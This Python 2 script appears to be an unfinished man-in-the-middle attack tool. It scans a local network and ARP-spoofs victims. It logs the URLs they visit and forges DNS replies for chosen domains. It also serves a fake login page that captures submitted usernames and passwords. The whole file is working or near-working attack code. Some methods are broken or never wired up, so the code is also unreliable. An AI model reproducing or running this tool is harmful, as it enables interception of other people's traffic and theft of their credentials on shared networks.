#! /usr/bin/env python2

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

from scapy.all import *
from nfqueue import *

from signal import signal, pause, SIGINT
from BaseHTTPServer import BaseHTTPRequestHandler
from subprocess import Popen, PIPE, STDOUT
from multiprocessing import Process, Pipe
from argparse import ArgumentParser
from threading import Thread, Lock
from socket import socket
from urllib2 import urlopen
from os import geteuid
from time import sleep
from sys import exit

conf.verb = 0
conf.checkIPaddr = 0

VERBOSE = False


class ARPSpoof(Thread):

    def __init__(self, iface, iface_mac, gw_ip, gw_mac, vic_ip):

        Thread.__init__(self)
        self.iface = iface
        self.iface_mac = iface_mac
        self.gw_ip = gw_ip
        self.gw_mac = gw_mac
        self.vic_ip = vic_ip
        self.vic_mac = get_mac(vic_ip)

    def run(self):

        if VERBOSE:
            print("Spoofing %s %s" % (self.vic_ip, self.vic_mac))

        gw_pkt = ARP(op=2, hwsrc=self.iface_mac, psrc=self.vic_ip,
                     hwdst=self.gw_mac, pdst=self.gw_ip)
        vic_pkt = ARP(op=2, hwsrc=self.iface_mac, psrc=self.gw_ip,
                      hwdst=self.vic_mac, pdst=self.vic_ip)

        while True:
            send(vic_pkt, count=2)
            send(gw_pkt, count=2)
            sniff(filter="arp and host %s" % self.vic_ip , count=1, timeout=4)

    def heal(self):

        if VERBOSE:
            print("Healing %s %s" % (self.vic_ip, self.vic_mac))

        gw_pkt = ARP(op=2, hwsrc=self.gw_mac, psrc=self.gw_ip,
                     hwdst=self.vic_mac, pdst=self.vic_ip)
        vic_pkt = ARP(op=2, hwsrc=self.vic_mac, psrc=self.vic_ip,
                      hwdst=self.gw_mac, pdst=self.gw_ip)

        send(vic_pkt, count=2)
        send(gw_pkt, count=2)


class DNSSpoof(Thread):

    def __init__(self, iface, vic_ip, domains, conn, lock):

        Thread.__init__(self)
        self.iface = iface
        self.vic_ip = vic_ip
        self.domains = self.fix_domains(domains)
        self.conn = conn
        self.my_ip = get_ip(self.iface)

    def run():

        nfqueue = queue()
        nfqueue.set_callback(self.reply)
        nfqueue.fast_open(0, AF_INET)
        nfqueue.set_mode(NFQNL_COPY_PACKET)
        nfqueue.try_run()

    def reply(self, pkt):

        data = IP(pkt.get_data())
        if not data.haslayer(DNSQR):
            pkt.set_verdict(NF_ACCEPT)
        else:
            ip = data[IP]
            udp = data[UDP]
            dns = data[DNS]

            reply = (IP(dst=ip.src, src=ip.dst) /
                     UDP(dport=udp.sport, sport=udp.dport) /
                     DNS(id=dns.id, qr=1, aa=1, qd=dns.qd,
                         an=DNSRR(rrname=dns.qd.qname, ttl=10, rdata=self.my_ip)))

            if dns.qd.qname in self.domains:
                pkt.set_verdict(NF_DROP)
                conn.send(["DNS", self.vic_ip, dns.qd.qname])
                lock.acquire()
                send(reply)

    def fix_domains(self, domains):

        fixed = []
        for domain in domains:
            if "www" == domain.split(".")[0]:
                fixed.append(".".join(domain.split(".")[1:]) + ".")
                fixed.append(domain + ".")
            else:
                fixed.append("www." + domain + ".")
                fixed.append(domain + ".")

        return fixed

    def init_nfqueue():

        Popen("modprobe nfnetlink_queue", shell=True, stdout=PIPE, stderr=STDOUT)
        Popen("iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE --queue-num 0",
              shell=True, stdout=PIPE, stderr=STDOUT)


class HTTPHandler(BaseHTTPRequestHandler):

    def __init__(self, service, conn, *args):

        self.service = service
        self.conn = conn
        BaseHTTPRequestHandler.__init__(self, *args)

    def parse(self, html):

        # TO BE IMPLEMENTED
        return html

    def do_GET(self):

        if self.path == "/":
            hfile = urlopen("http://%s" % self.service)
            html = self.parse(hfile.read())

        try:
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(html)
            return

        except IOError:
            self.send_error(404, "Server Not Found: %s" % self.path)

    def do_POST(self):

        if self.path == "/login":
            environ = {'REQUEST_METHOD': 'POST', 'CONTENT_TYPE': self.headers['Content-Type']}
            form = FieldStorage(fp=self.rfile, headers=self.headers, environ=environ)

            self.conn.send(["CRED", self.service, form["user"].value, form["pass"].value])
            self.send_response(200)
            self.end_headers()
            self.wfile.write("<meta http-equiv=\"refresh\" content=\"0; url=%s\" />" %
                             self.service)
            return


class WebServer(Thread):

    def __init__(self, service, port, conn):

        Thread.__init__(self)
        self.service = service
        self.port = port
        self.conn = conn

    def run(self):

        server = HTTPServer(('', self.port), self.handler)
        server.serve_forever()

    def handler(self, *args):

        HTTPHandler(self.service, self.conn, *args)


class URLInspect(Thread):

    def __init__(self, iface, vic_ip):

        Thread.__init__(self)
        self.iface = iface
        self.vic_ip = vic_ip
        self.past_url = None

    def run(self):

        sniff(store=0, filter="port 80 and host %s"
              % self.vic_ip, prn=self.parse, iface=self.iface)

    def parse(self, pkt):

        if pkt.haslayer(Raw) and pkt.haslayer(TCP):
            load = repr(pkt[Raw].load)[1:-1]

            try:
                headers, body = load.split(r"\r\n\r\n", 1)
            except:
                headers = load
            header_lines = headers.split(r"\r\n")

            url = ""
            post = ""
            get = ""
            host = ""

            for l in header_lines:
                if re.search('[Hh]ost: ', l):
                    try:
                        host = l.split('Host: ', 1)[1]
                    except:
                        try:
                            host = l.split('host: ', 1)[1]
                        except:
                            pass
                if re.search('GET /', l):
                    try:
                        get = l.split('GET ')[1].split(' ')[0]
                    except:
                        pass
                if re.search('POST /', l):
                    try:
                        post = l.split(' ')[1].split(' ')[0]
                    except:
                        pass
            if host and post:
                url = host+post
            elif host and get:
                url = host+get

            if url and not "ocsp" in url:
                skip = [".jpg", ".jpeg", ".gif", ".png", ".css", ".ico", ".js", ".svg"]

                if any(i in url for i in skip):
                    pass
                elif not url == self.past_url:
                    self.past_url = url

                    if len(url) > 80:
                        url = url[:80] + "..."

                    print("URL: %s => %s" % (self.vic_ip, url))


def arpspoof(vic_ips, iface, conn):

    iface_mac = get_if_mac(iface)
    gw_ip = get_gw(iface)
    gw_mac = get_mac(gw_ip)

    forward(True)

    arpspoof_thrds = []
    for vic_ip in vic_ips:
        arpspoof_thrds.append(ARPSpoof(iface, iface_mac, gw_ip, gw_mac, vic_ip))
        arpspoof_thrds[-1].start()

    while True:
        if conn.poll():
            recieved = conn.recv()

            if recieved[0] == "NEW_VIC":
                vic_ips.append(recieved[1]) # ?
                arpspoof_thrds.append(ARPSpoof(iface, recieved[1]))
                arpspoof_thrds[-1].start()

            elif recieved[0] == "STOP":
                for thrd in arpspoof_thrds:
                    thrd.heal()
                forward(False)
                break

        sleep(0.2)


def urlinspect(vic_ips, iface, conn):

    urlinspect_thrds = []
    for vic_ip in vic_ips:
        urlinspect_thrds.append(URLInspect(iface, vic_ip))
        urlinspect_thrds[-1].start()

    while True:
        if conn.poll():
            recieved = conn.recv()

            if recieved[0] == "NEW_VIC":
                vic_ips.append(recieved[1]) # ?
                urlinspect_thrds.append(URLInspect(iface, recieved[1]))
                urlinspect_thrds[-1].start()

            elif recieved[0] == "STOP":
                break

        sleep(0.2)


def forward(enable):

    if enable:
        Popen("sysctl -w net.ipv4.ip_forward=1", shell=True, stdout=PIPE, stderr=STDOUT)
    else:
        Popen("sysctl -w net.ipv4.ip_forward=0", shell=True, stdout=PIPE, stderr=STDOUT)


def flush():

    Popen("iptables -F", shell=True, stdout=PIPE)
    Popen("iptables -t nat -F", shell=True, stdout=PIPE)
    Popen("iptables -X", shell=True, stdout=PIPE)
    Popen("iptables -t nat -X", shell=True, stdout=PIPE)


def nscan(iface, hosts):

    my_ip = get_ip(iface)
    gw_ip = get_gw(iface)

    p = Popen("ip route | grep %s | grep 'src %s' | awk '{print $1}'" %
              (iface, my_ip), shell=True, stdout=PIPE)
    netid = p.communicate()[0].rstrip()

    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") /
                     ARP(pdst=netid), timeout=4, iface=iface, inter=0.1)

    for snd, rcv in ans:
        if rcv.psrc not in [gw_ip, my_ip] + hosts:
            if VERBOSE:
                print("New host detected %s" % rcv.psrc)
            hosts.append(rcv.psrc)

    return hosts


def get_ip(iface):

    p = Popen("ip route | grep %s | grep 'src' | awk '{print $9}'" % iface,
              shell=True, stdout=PIPE)
    output = p.communicate()[0].rstrip()
    return output


def get_mac(ip, local=False):

    if ip == "255.255.255.255":
        return "ff:ff:ff:ff:ff:ff"

    if local:
        p = Popen("arp -a | grep  '(%s)' | awk  '{print $4}'" % ip,
                  shell=True, stdout=PIPE)
        output = p.communicate()[0].rstrip()
        return output
    else:
        ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") /
                         ARP(pdst=ip), timeout=4, retry=2)
        for snd, rcv in ans:
            return rcv.sprintf("%Ether.src%")


def get_gw(iface):

    p = Popen("ip route show 0.0.0.0/0 dev %s | awk '{print $3}'" % iface,
              shell=True, stdout=PIPE)
    output = p.communicate()[0].rstrip()
    return output


def valid_ip(s):

    if len(s.split('.')) != 4:
        return False

    for x in s.split('.'):
        if not x.isdigit():
            return False
        if int(x) < 0 or int(x) > 255:
            return False
    return True


def get_if_list():

    f = open("/proc/net/dev", "r")
    lst = []
    f.readline()
    f.readline()

    for l in f:
        iface = l.split(":")[0].strip()
        if iface != "lo":
            lst.append(iface)
    return lst


def get_if_mac(iface):

    s = socket()
    ifreq = ioctl(s, 0x8927, struct.pack("16s16x", iface))
    s.close()
    family, mac = struct.unpack("16xh6s8x", ifreq)
    return ("%02x:"*6)[:-1] % tuple(map(ord, mac))


def get_dhcp(iface):

    dhcp = (Ether(dst='ff:ff:ff:ff:ff:ff') /
            IP(src="0.0.0.0", dst="255.255.255.255") /
            UDP(sport=68, dport=67) /
            BOOTP(chaddr=get_if_mac(iface)) /
            DHCP(options=[("message-type", "discover"),
                ("param_req_list",
                 chr(DHCPRevOptions["router"][0]),
                 chr(DHCPRevOptions["domain"][0]),
                 chr(DHCPRevOptions["server_id"][0]),
                 chr(DHCPRevOptions["name_server"][0]),),
                "end"]))
    ans, unans = srp(dhcp, timeout=4, retry=2)

    if ans:
        for s, r in ans:
            dhcp_opt = r[0][DHCP].options
            dhcp_ip = r[0][IP].src
            for opt in dhcp_opt:
                if 'domain' in opt:
                    local_domain = opt[1]
                    pass
                else:
                    local_domain = 'None'
                if 'name_server' in opt:
                    dns_ip = opt[1]
    else:
        dns_ip = get_gw(iface)
        dhcp_ip = dns_ip
        local_domain = 'None'

    return [dhcp_ip, dns_ip, local_domain]


def main():

    def sig_handler(signal, frame):

        print("Exitting...")
        parent_conn.send(["STOP", None])
        child_conn.send(["STOP", None])


    signal(SIGINT, sig_handler)

    parser = ArgumentParser()
    parser.add_argument("-v", "--verbose", action="store_true",
                        help="enable verbose mode")
    parser.add_argument("-iface", metavar="IFACE",
                        help="network interface [%s]" % conf.iface)
    parser.add_argument("-ip", metavar="IPADDR",
                        help="specify a victim IP address [all]")
    args = parser.parse_args()

    parent_conn, child_conn = Pipe()

    if geteuid() != 0:
        exit("ERROR: Please run as root/superuser")

    global VERBOSE
    if args.verbose:
        VERBOSE = True

    if args.iface:
        iface = args.iface
    else:
        print("WARNING: No interface selected, using default (%s)" % conf.iface)
        iface = conf.iface

    vic_ips = []
    if args.ip:
        if valid_ip(args.ip):
            vic_ips.append(args.ip)
        else:
            exit("ERROR: IP address is invalid")
    else:
        print("Scanning network")

        while len(vic_ips) == 0:
            vic_ips = nscan(iface, vic_ips)

            if len(vic_ips) > 0:
                break

            print("WARNING: No hosts detected, rescanning network")

    print("Starting ARP spoofing process")
    arpspoof_proc = Process(target=arpspoof, args=(vic_ips, iface, child_conn))
    arpspoof_proc.start()

    print("Starting URL inspection")
    urlinspect_proc = Process(target=urlinspect, args=(vic_ips, iface, child_conn))
    urlinspect_proc.start()

    while True:
        if parent_conn.poll():
            recieved = parent_conn.recv()

            if recieved[0] == "STOP":
                break

        sleep(0.2)


if __name__ == '__main__':
    main()


## TO DO:
# Watchdog process to keep watching ARP packets
# and add new detected IPs to the vic_ips list.
